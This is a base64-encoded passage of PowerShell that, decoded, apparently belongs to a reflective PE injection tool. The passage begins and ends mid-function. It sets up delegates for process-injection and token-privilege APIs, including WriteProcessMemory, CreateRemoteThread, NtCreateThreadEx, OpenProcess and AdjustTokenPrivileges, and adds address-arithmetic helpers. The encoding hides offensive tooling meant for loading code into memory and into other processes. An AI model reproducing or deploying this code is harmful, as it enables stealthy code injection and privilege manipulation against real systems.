ZSBHZXRQcm9jQWRkcmVzcyAtVmFsdWUgJEdldFByb2NBZGRyZXNzCiAgICAgICAgCiAgICAgICAgJEdldFByb2NBZGRyZXNzSW50UHRyQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0UHJvY0FkZHJlc3MgI1RoaXMgaXMgc3RpbGwgR2V0UHJvY0FkZHJlc3MsIGJ1dCBpbnN0ZWFkIG9mIFBvd2VyU2hlbGwgY29udmVydGluZyB0aGUgc3RyaW5nIHRvIGEgcG9pbnRlciwgeW91IG11c3QgZG8gaXQgeW91cnNlbGYKICAgICAgICAkR2V0UHJvY0FkZHJlc3NJbnRQdHJEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkR2V0UHJvY0FkZHJlc3NJbnRQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0UHJvY0FkZHJlc3NJbnRQdHJBZGRyLCAkR2V0UHJvY0FkZHJlc3NJbnRQdHJEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRQcm9jQWRkcmVzc0ludFB0ciAtVmFsdWUgJEdldFByb2NBZGRyZXNzSW50UHRyCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxGcmVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWUKICAgICAgICAkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSkgKFtCb29sXSkKICAgICAgICAkVmlydHVhbEZyZWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVBZGRyLCAkVmlydHVhbEZyZWVEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAtTmFtZSBWaXJ0dWFsRnJlZSAtVmFsdWUgJFZpcnR1YWxGcmVlCiAgICAgICAgCiAgICAgICAgJFZpcnR1YWxGcmVlRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsRnJlZUV4CiAgICAgICAgJFZpcnR1YWxGcmVlRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0pIChbQm9vbF0pCiAgICAgICAgJFZpcnR1YWxGcmVlRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVFeEFkZHIsICRWaXJ0dWFsRnJlZUV4RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEZyZWVFeCAtVmFsdWUgJFZpcnR1YWxGcmVlRXgKICAgICAgICAKICAgICAgICAkVmlydHVhbFByb3RlY3RBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsUHJvdGVjdAogICAgICAgICRWaXJ0dWFsUHJvdGVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFZpcnR1YWxQcm90ZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxQcm90ZWN0QWRkciwgJFZpcnR1YWxQcm90ZWN0RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbFByb3RlY3QgLVZhbHVlICRWaXJ0dWFsUHJvdGVjdAogICAgICAgIAogICAgICAgICRHZXRNb2R1bGVIYW5kbGVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRNb2R1bGVIYW5kbGVBCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddKSAoW0ludFB0cl0pCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRNb2R1bGVIYW5kbGVBZGRyLCAkR2V0TW9kdWxlSGFuZGxlRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgR2V0TW9kdWxlSGFuZGxlIC1WYWx1ZSAkR2V0TW9kdWxlSGFuZGxlCiAgICAgICAgCiAgICAgICAgJEZyZWVMaWJyYXJ5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRnJlZUxpYnJhcnkKICAgICAgICAkRnJlZUxpYnJhcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbQm9vbF0pIChbSW50UHRyXSkKICAgICAgICAkRnJlZUxpYnJhcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkRnJlZUxpYnJhcnlBZGRyLCAkRnJlZUxpYnJhcnlEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGcmVlTGlicmFyeSAtVmFsdWUgJEZyZWVMaWJyYXJ5CiAgICAgICAgCiAgICAgICAgJE9wZW5Qcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgT3BlblByb2Nlc3MKICAgICAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRPcGVuUHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRPcGVuUHJvY2Vzc0FkZHIsICRPcGVuUHJvY2Vzc0RlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE9wZW5Qcm9jZXNzIC1WYWx1ZSAkT3BlblByb2Nlc3MKICAgICAgICAKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSkgKFtVSW50MzJdKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyLCAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFdhaXRGb3JTaW5nbGVPYmplY3QgLVZhbHVlICRXYWl0Rm9yU2luZ2xlT2JqZWN0CiAgICAgICAgCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdyaXRlUHJvY2Vzc01lbW9yeQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyLCAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgV3JpdGVQcm9jZXNzTWVtb3J5IC1WYWx1ZSAkV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAgICAgCiAgICAgICAgJFJlYWRQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgUmVhZFByb2Nlc3NNZW1vcnkKICAgICAgICAkUmVhZFByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFJlYWRQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFJlYWRQcm9jZXNzTWVtb3J5QWRkciwgJFJlYWRQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUmVhZFByb2Nlc3NNZW1vcnkgLVZhbHVlICRSZWFkUHJvY2Vzc01lbW9yeQogICAgICAgIAogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVSZW1vdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgQ3JlYXRlUmVtb3RlVGhyZWFkIC1WYWx1ZSAkQ3JlYXRlUmVtb3RlVGhyZWFkCiAgICAgICAgCiAgICAgICAgJEdldEV4aXRDb2RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0RXhpdENvZGVUaHJlYWQKICAgICAgICAkR2V0RXhpdENvZGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJEdldEV4aXRDb2RlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEV4aXRDb2RlVGhyZWFkQWRkciwgJEdldEV4aXRDb2RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgR2V0RXhpdENvZGVUaHJlYWQgLVZhbHVlICRHZXRFeGl0Q29kZVRocmVhZAogICAgICAgIAogICAgICAgICRPcGVuVGhyZWFkVG9rZW5BZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBPcGVuVGhyZWFkVG9rZW4KICAgICAgICAkT3BlblRocmVhZFRva2VuRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbQm9vbF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkT3BlblRocmVhZFRva2VuID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5UaHJlYWRUb2tlbkFkZHIsICRPcGVuVGhyZWFkVG9rZW5EZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBPcGVuVGhyZWFkVG9rZW4gLVZhbHVlICRPcGVuVGhyZWFkVG9rZW4KICAgICAgICAKICAgICAgICAkR2V0Q3VycmVudFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldEN1cnJlbnRUaHJlYWQKICAgICAgICAkR2V0Q3VycmVudFRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKCkgKFtJbnRQdHJdKQogICAgICAgICRHZXRDdXJyZW50VGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldEN1cnJlbnRUaHJlYWRBZGRyLCAkR2V0Q3VycmVudFRocmVhZERlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldEN1cnJlbnRUaHJlYWQgLVZhbHVlICRHZXRDdXJyZW50VGhyZWFkCiAgICAgICAgCiAgICAgICAgJEFkanVzdFRva2VuUHJpdmlsZWdlc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIEFkanVzdFRva2VuUHJpdmlsZWdlcwogICAgICAgICRBZGp1c3RUb2tlblByaXZpbGVnZXNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEFkanVzdFRva2VuUHJpdmlsZWdlc0FkZHIsICRBZGp1c3RUb2tlblByaXZpbGVnZXNEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBBZGp1c3RUb2tlblByaXZpbGVnZXMgLVZhbHVlICRBZGp1c3RUb2tlblByaXZpbGVnZXMKICAgICAgICAKICAgICAgICAkTG9va3VwUHJpdmlsZWdlVmFsdWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBMb29rdXBQcml2aWxlZ2VWYWx1ZUEKICAgICAgICAkTG9va3VwUHJpdmlsZWdlVmFsdWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICRMb29rdXBQcml2aWxlZ2VWYWx1ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb29rdXBQcml2aWxlZ2VWYWx1ZUFkZHIsICRMb29rdXBQcml2aWxlZ2VWYWx1ZURlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExvb2t1cFByaXZpbGVnZVZhbHVlIC1WYWx1ZSAkTG9va3VwUHJpdmlsZWdlVmFsdWUKICAgICAgICAKICAgICAgICAkSW1wZXJzb25hdGVTZWxmQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgSW1wZXJzb25hdGVTZWxmCiAgICAgICAgJEltcGVyc29uYXRlU2VsZkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnQzMl0pIChbQm9vbF0pCiAgICAgICAgJEltcGVyc29uYXRlU2VsZiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRJbXBlcnNvbmF0ZVNlbGZBZGRyLCAkSW1wZXJzb25hdGVTZWxmRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSW1wZXJzb25hdGVTZWxmIC1WYWx1ZSAkSW1wZXJzb25hdGVTZWxmCiAgICAgICAgCiAgICAgICAgJE50Q3JlYXRlVGhyZWFkRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIE50RGxsLmRsbCBOdENyZWF0ZVRocmVhZEV4CiAgICAgICAgJE50Q3JlYXRlVGhyZWFkRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0Jvb2xdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtVSW50MzJdKQogICAgICAgICROdENyZWF0ZVRocmVhZEV4ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE50Q3JlYXRlVGhyZWFkRXhBZGRyLCAkTnRDcmVhdGVUaHJlYWRFeERlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50Q3JlYXRlVGhyZWFkRXggLVZhbHVlICROdENyZWF0ZVRocmVhZEV4CiAgICAgICAgCiAgICAgICAgJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBLZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3MKICAgICAgICAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJc1dvdzY0UHJvY2VzcyAtVmFsdWUgJElzV293NjRQcm9jZXNzCiAgICAgICAgCiAgICAgICAgJENyZWF0ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgS2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZAogICAgICAgICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIENyZWF0ZVRocmVhZCAtVmFsdWUgJENyZWF0ZVRocmVhZAogICAgICAgIAogICAgICAgIHJldHVybiAkV2luMzJGdW5jdGlvbnMKICAgIH0KICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiAgICAgICAgICAgIAogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgIyMjIyMjIyMjIyMgICAgSEVMUEVSUyAgICMjIyMjIyMjIyMjIwogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKICAgICNQb3dlcnNoZWxsIG9ubHkgZG9lcyBzaWduZWQgYXJpdGhtZXRpYywgc28gaWYgd2Ugd2FudCB0byBjYWxjdWxhdGUgbWVtb3J5IGFkZHJlc3NlcyB3ZSBoYXZlIHRvIHVzZSB0aGlzIGZ1bmN0aW9uCiAgICAjVGhpcyB3aWxsIGFkZCBzaWduZWQgaW50ZWdlcnMgYXMgaWYgdGhleSB3ZXJlIHVuc2lnbmVkIGludGVnZXJzIHNvIHdlIGNhbiBhY2N1cmF0ZWx5IGNhbGN1bGF0ZSBtZW1vcnkgYWRkcmVzc2VzCiAgICBGdW5jdGlvbiBTdWItU2lnbmVkSW50QXNVbnNpZ25lZAogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDY0XQogICAgICAgICRWYWx1ZTEsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJFZhbHVlMgogICAgICAgICkKICAgICAgICAKICAgICAgICBbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKQogICAgICAgIFtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpCiAgICAgICAgW0J5dGVbXV0kRmluYWxCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbVUludDY0XTApCgogICAgICAgIGlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkKICAgICAgICB7CiAgICAgICAgICAgICRDYXJyeU92ZXIgPSAwCiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJFZhbHVlMUJ5dGVzLkNvdW50OyAkaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkVmFsID0gJFZhbHVlMUJ5dGVzWyRpXSAtICRDYXJyeU92ZXIKICAgICAgICAgICAgICAgICNTdWIgYnl0ZXMKICAgICAgICAgICAgICAgIGlmICgkVmFsIC1sdCAkVmFsdWUyQnl0ZXNbJGldKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRWYWwgKz0gMjU2CiAgICAgICAgICAgICAgICAgICAgJENhcnJ5T3ZlciA9IDEKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQ2FycnlPdmVyID0gMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtVSW50MTZdJFN1bSA9ICRWYWwgLSAkVmFsdWUyQnl0ZXNbJGldCgogICAgICAgICAgICAgICAgJEZpbmFsQnl0ZXNbJGldID0gJFN1bSAtYmFuZCAweDAwRkYKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiQ2Fubm90IHN1YnRyYWN0IGJ5dGVhcnJheXMgb2YgZGlmZmVyZW50IHNpemVzIgogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJEZpbmFsQnl0ZXMsIDApCiAgICB9CiAgICAKCiAgICBGdW5jdGlvbiBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZAogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDY0XQogICAgICAgICRWYWx1ZTEsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJFZhbHVlMgogICAgICAgICkKICAgICAgICAKICAgICAgICBbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKQogICAgICAgIFtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpCiAgICAgICAgW0J5dGVbXV0kRmluYWxCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbVUludDY0XTApCgogICAgICAgIGlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkKICAgICAgICB7CiAgICAgICAgICAgICRDYXJyeU92ZXIgPSAwCiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJFZhbHVlMUJ5dGVzLkNvdW50OyAkaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjQWRkIGJ5dGVzCiAgICAgICAgICAgICAgICBbVUludDE2XSRTdW0gPSAkVmFsdWUxQnl0ZXNbJGldICsgJFZhbHVlMkJ5dGVzWyRpXSArICRDYXJyeU92ZXIKCiAgICAgICAgICAgICAgICAkRmluYWxCeXRlc1skaV0gPSAkU3VtIC1iYW5kIDB4MDBGRgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAoKCRTdW0gLWJhbmQgMHhGRjAwKSAtZXEgMHgxMDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJENhcnJ5T3ZlciA9IDEKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQ2FycnlPdmVyID0gMAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAg